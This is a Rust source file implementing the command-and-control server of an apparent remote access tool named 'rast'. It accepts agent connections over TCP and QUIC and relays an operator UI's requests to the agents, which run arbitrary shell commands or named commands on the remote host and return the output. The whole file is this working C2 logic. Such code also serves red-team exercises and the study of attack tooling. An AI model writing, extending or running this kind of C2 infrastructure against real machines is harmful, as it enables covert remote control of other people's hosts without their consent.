//! C2 implementation.

use std::{collections::HashMap, net::SocketAddr, sync::Arc, vec};

use anyhow::{bail, Error, Result};
use bidirectional_channel::ReceivedRequest;
use futures_util::{sink::SinkExt, stream::StreamExt};
use tokio::{
    sync::{
        mpsc::{unbounded_channel, UnboundedReceiver},
        Mutex,
    },
    task::JoinHandle,
};
use tracing::{debug, info, trace};

use rast::{
    encoding::{JsonPackager, Packager},
    messages::{
        c2_agent::{AgentMessage, AgentResponse, C2Request},
        ui_request::{IpData, UiRequest, UiResponse},
    },
    protocols::{
        Messager, ProtoConnection, ProtoFactory, ProtoServer, quic::QuicFactory, tcp::TcpFactory,
    },
    RastError,
    settings::{Connection, Settings},
};

use crate::c2::ui_manager::UiManager;

mod ui_manager;

#[doc(hidden)]
#[derive(Debug)]
pub enum Dummy {
    Nothing,
}

// TODO: implement
#[doc(hidden)]
pub enum C2Notification {
    AgentConnected(SocketAddr),
    AgentDisconnected(SocketAddr),
}

#[derive(Debug)]
pub struct RastC2 {
    servers: Vec<JoinHandle<()>>,
    connections: HashMap<SocketAddr, Arc<Mutex<dyn ProtoConnection>>>,
    connections_rx: UnboundedReceiver<Arc<Mutex<dyn ProtoConnection>>>,
    ui: Option<UiManager>,
}

impl RastC2 {
    /// Creates new instance using provided [Settings].
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let (ctx, crx) = unbounded_channel();
        let mut servers = vec![];

        for conf in settings.server.agent_listeners.iter() {
            let server = match conf {
                Connection::Tcp(tcp_conf) => TcpFactory::new_server(tcp_conf).await,
                Connection::Quic(quic_conf) => QuicFactory::new_server(quic_conf).await,
                _ => bail!(RastError::Unknown),
            };

            if let Ok(server) = server {
                info!("Creating agent listener at: {server:?}");
                let cloned = ctx.clone();
                let task = tokio::spawn(async move {
                    loop {
                        if let Ok(conn) = server.get_conn().await {
                            if let Err(e) = cloned.send(conn) {
                                debug!("Failed to pass agent connection to C2: {:?}", e);
                            };
                        }
                    }
                });
                servers.push(task);
            }
        }

        let ui = if !&settings.server.ui_listeners.is_empty() {
            let ui = UiManager::with_settings(&settings).await?;
            Some(ui)
        } else {
            None
        };

        if servers.is_empty() {
            return Err(Error::msg("No servers running."));
        }

        let rastc2 = RastC2 {
            servers,
            connections: HashMap::new(),
            connections_rx: crx,
            ui,
        };

        Ok(rastc2)
    }

    /// Starts C2 server.
    pub async fn run(&mut self) -> Result<()> {
        info!("RastC2 instance running");
        loop {
            while let Ok(conn) = self.connections_rx.try_recv() {
                info!(
                    "Received agent connection from: {:?}",
                    conn.lock().await.remote_addr()
                );
                self.add_connection(conn).await?;
                debug!("Added agent connection");
            }

            if let Some(ui) = &self.ui {
                while let Ok(req) = ui.try_recv_request() {
                    trace!("Received UI request");
                    if let Err(e) = self.handle_ui_request(req).await {
                        debug!("Failed to handle UI request: {:?}", e);
                    };
                }
            }
        }
    }

    // #[tracing::instrument]
    async fn add_connection(&mut self, conn: Arc<Mutex<dyn ProtoConnection>>) -> Result<()> {
        let ip = conn.lock().await.remote_addr()?;
        self.connections.insert(ip, conn);
        Ok(())
    }

    async fn handle_ui_request(&self, req: ReceivedRequest<UiRequest, UiResponse>) -> Result<()> {
        trace!("{:?}", req.as_ref());
        let packager = JsonPackager::default();
        let response = match req.as_ref() {
            UiRequest::Ping => UiResponse::Pong,
            UiRequest::GetIps => {
                let ips = self.connections.keys().map(|ip| ip.to_string()).collect();
                UiResponse::GetIps(ips)
            },
            UiRequest::GetIpData(ip) => {
                // let _conn = self.connections.get(todo!());
                let ipdata = IpData { ip: *ip };
                UiResponse::GetIpData(ipdata)
            },
            UiRequest::ShellRequest(ip, cmd) => {
                let conn = self.connections.get(ip).unwrap();
                let mut conn = conn.lock().await;

                // TODO: put all of that into struct and do abstractions
                let mut messager = Messager::new(&mut *conn);

                let request = AgentMessage::C2Request(C2Request::ExecShell(cmd.to_string()));
                let request = packager.encode(&request)?;

                let _result = messager.send(request).await;
                let bytes = messager.next().await.unwrap().unwrap();

                let output = packager.decode(&bytes.into());
                let output = output?;
                let AgentMessage::AgentResponse(AgentResponse::ShellResponse(output)) = output else { todo!()};

                UiResponse::ShellOutput(output)
            },
            UiRequest::GetCommands(ip) => {
                let conn = self.connections.get(ip).unwrap();
                let mut conn = conn.lock().await;

                // TODO: put all of that into struct and do abstractions
                let mut messager = Messager::new(&mut *conn);

                let request = AgentMessage::C2Request(C2Request::GetCommands);
                let request = packager.encode(&request)?;

                let _result = messager.send(request).await;
                let bytes = messager.next().await.unwrap().unwrap();

                let output = packager.decode(&bytes.into());
                let output = output?;
                let AgentMessage::AgentResponse(AgentResponse::Commands(commands)) = output else { todo!()};

                UiResponse::Commands(commands)
            },
            UiRequest::ExecCommand(ip, command, args) => {
                let conn = self.connections.get(ip).unwrap();
                let mut conn = conn.lock().await;

                // TODO: put all of that into struct and do abstractions
                let mut messager = Messager::new(&mut *conn);

                let request = AgentMessage::C2Request(C2Request::ExecCommand(
                    command.to_string(),
                    args.clone(),
                ));
                let request = packager.encode(&request)?;

                let _result = messager.send(request).await;
                let bytes = messager.next().await.unwrap().unwrap();

                let output = packager.decode(&bytes.into());
                let msg: AgentMessage = output?;
                let output = match msg {
                    AgentMessage::C2Request(_) => unreachable!(),
                    AgentMessage::AgentResponse(resp) => match resp {
                        AgentResponse::CommandOutput(output) => output,
                        AgentResponse::Error(err) => err,
                        _ => unreachable!(),
                    },
                };

                UiResponse::CommandOutput(output)
            },
        };
        trace!("{:?}", response);
        let result = req.respond(response);
        trace!("{:?}", result);
        Ok(())
    }
}
